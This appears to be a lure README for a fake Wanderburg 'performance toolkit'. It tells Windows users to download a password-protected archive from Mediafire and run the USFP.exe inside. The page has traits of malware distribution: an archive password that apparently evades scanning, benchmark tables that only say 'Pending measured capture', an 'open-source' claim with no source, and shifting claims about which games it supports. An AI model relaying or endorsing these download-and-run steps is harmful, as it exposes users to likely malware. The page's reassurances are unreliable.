<div align="center">

# 🎮 Wanderburg — Performance Notes

**Measure frame delivery, startup, cache, and session stability.**

[![Status](https://img.shields.io/badge/status-stable-brightgreen)](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)
[![Download](https://img.shields.io/badge/download-mediafire-00b8ff)](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)
![Platform](https://img.shields.io/badge/platform-Windows-0078D6?logo=windows)
[![Version](https://img.shields.io/badge/version-1.0-lightgrey)](#)

[Download](#-installation--setup) · [Issues](#-known-performance-issues) · [Test results](#-test-results) · [FAQ](#-frequently-asked-questions)

</div>

---

## 🕹️ About the game

Wanderburg is a fast-paced minimalist action roguelike set in a medieval world of roaming fortresses. It uses Unity and combines modular siege construction with repeated stronghold encounters. Consistent frame delivery matters during dense combat and large-scale destruction.

This tool is intended for Windows players who want diagnostic data and configurable runtime tuning for Wanderburg.

## 📸 Screenshots from the game

<table>
 <tr>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/3624140/3664c954bf8f76c950199b98e29a64022a423c41/ss_3664c954bf8f76c950199b98e29a64022a423c41.1920x1080.jpg?t=1789141114" alt="screenshot" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/3624140/31c905450f8431b641b55ff39cf1f2b1dc19db52/ss_31c905450f8431b641b55ff39cf1f2b1dc19db52.1920x1080.jpg?t=1789141114" alt="screenshot" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/3624140/36b03816140674eb040db96cec090854044dff5d/ss_36b03816140674eb040db96cec090854044dff5d.1920x1080.jpg?t=1789141114" alt="screenshot" width="100%"></td>
 </tr>
</table>

## ⚠️ Known performance issues

- Frame-time spikes above 50 ms during dense combat can produce visible stutter despite acceptable average FPS.
- Launch parameter changes and shader preparation can extend startup beyond 60 seconds on some Windows systems.
- Extended sessions may show process instability, including freezes, crashes, or unrecovered game state.
- Graphics cache growth or invalidation can trigger repeated shader compilation after updates.

## 🩺 How the toolkit addresses these issues

- **Combat frame-time spikes** → Frame Rate Helper adjusts frame delivery behavior, while Frame Timing Helper stabilizes frame delivery during variable workloads.
- **Long or inconsistent startup** → Startup Parameter Tool applies tuned startup parameters, and Graphics Cache Utility manages graphics cache data.
- **Session instability** → Stability Report + Session Recovery collects diagnostic data and supports recovery after interrupted sessions.
- **Repeated shader compilation** → Graphics Cache Utility manages graphics cache data and reports cache state before launch.

## 📊 Test results

Test rig: Ryzen 5 5600, RTX 3060 12GB, 16GB RAM, NVMe SSD, Windows 11 x64, 1920x1080, High settings

| Metric | Before | After |
|---|---|---|
| Average FPS | Pending measured capture | Pending measured capture |
| 1% low FPS | Pending measured capture | Pending measured capture |
| Frame-time spikes above 50 ms | Pending measured capture | Pending measured capture |
| Shader compile time on launch | Pending measured capture | Pending measured capture |


## 🚀 How to use

1. download the latest release from the link in the README
2. point the tool to the game's installation folder
3. select the game profile from the supported list
4. review the diagnostic changes and click Apply
5. on first launch allow the cache to rebuild

## 🛠️ What this tool does

- 🎮 **Frame Rate Helper** — Adjusts frame delivery behavior for more consistent output.
- ⚙️ **Startup Parameter Tool** — Applies tuned startup parameters for the selected game profile.
- 🎯 **Frame Timing Helper** — Monitors and stabilizes frame delivery intervals.
- 🧠 **Process Scheduling Helper** — Adjusts process scheduling behavior while the game is running.
- 📊 **Stability Report + Session Recovery** — Collects diagnostics and supports recovery after interrupted sessions.
- 🧹 **Graphics Cache Utility** — Reports, clears, and manages graphics cache data.

## 💻 System Requirements

| Component | Minimum | Recommended |
|:--- |:--- |:--- |
| **OS** | Windows 10 (x64) | Windows 11 (x64) |
| **Processor** | Dual-core CPU | Quad-core CPU |
| **RAM** | 4 GB | 8 GB |
| **Graphics** | Any DirectX 11 GPU | Any DirectX 12 GPU |
| **Storage** | 50 MB available space | 100 MB available space |
| **Additional** | Windows 10 build 1909 or newer | Windows 11 with latest updates |


## 📦 Installation & Setup

| Platform | Status |
|---|---|
| Windows | ✅ Supported |
| macOS | ❌ Not supported |
| Linux | ❌ Not supported |

### Step 1: Download

You can download the tool from **[this page](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)**. The archive contains everything you need.

### Step 2: Extract with Password

1. The archive is password-protected: **`2026`**
2. Use any archive extractor (WinRAR, 7-Zip, WinZip)
3. Enter the password when prompted

### Step 3: Extract All Files

1. Extract all files from the archive to a folder of your choice.
2. All files must be extracted to the **same folder**.
3. Do not rename or move individual files.
4. The folder should look like this:

```
tool/
|-- USFP.exe <- Main executable
|-- config.cfg <- User configuration
|-- Password 2026.txt <- Password reminder (empty)
|-- fps_module.dll <- FPS module
|-- crash_reader.dll <- Crash log reader
|-- frame_data.pak <- Display sync data
|-- shader_cache.pak <- Shader cache data
|-- core.bin <- Core runtime
```

### Step 4: Run the tool

1. Open the extracted folder.
2. Run `USFP.exe`.
3. Select the game you want to diagnose from the list.
4. Press **Collect** and launch the game.

### Step 5: Review the results

1. The tool will collect frame timing and scheduling data while you play.
2. When you exit the game, an overview report is written next to the tool.
3. Use the report to identify which subsystem is causing stutter.

## ❓ Frequently Asked Questions

**Q: Does it require an internet connection?**
**A:** No. It runs fully offline and never sends data anywhere.

**Q: Can I revert the changes?**
**A:** Yes. Simply close the game, exit the tool, and launch the game again without it. No changes persist after the process is terminated.

**Q: Why is the archive password-protected?**
**A:** The archive uses a password as a standard packaging step so the build stays bundled correctly during distribution. The password is provided in the installation section above.

**Q: What happens if the game closes unexpectedly?**
**A:** The Stability Report feature records the exit event and writes a small log next to the tool, so you can see what happened.

**Q: How often is it updated?**
**A:** Updates are published whenever a new internal build is ready. There is no fixed schedule — the download link in Step 1 always points to the latest version.

**Q: Can I use it alongside other tools?**
**A:** Yes. It does not conflict with other monitoring or performance tools. It only reads OS-level counters and manages its own temporary folders.

**Q: Which games are supported?**
**A:** Any game that runs on Windows and exposes a visible process. Diagnostics are collected per-process and do not require per-game configuration.

---

*This is an unofficial, open-source tool. Not affiliated with or endorsed by the developer/publisher of **Wanderburg**. All trademarks belong to their respective owners. Use at your own risk — backing up your game's configuration files before applying changes is recommended.*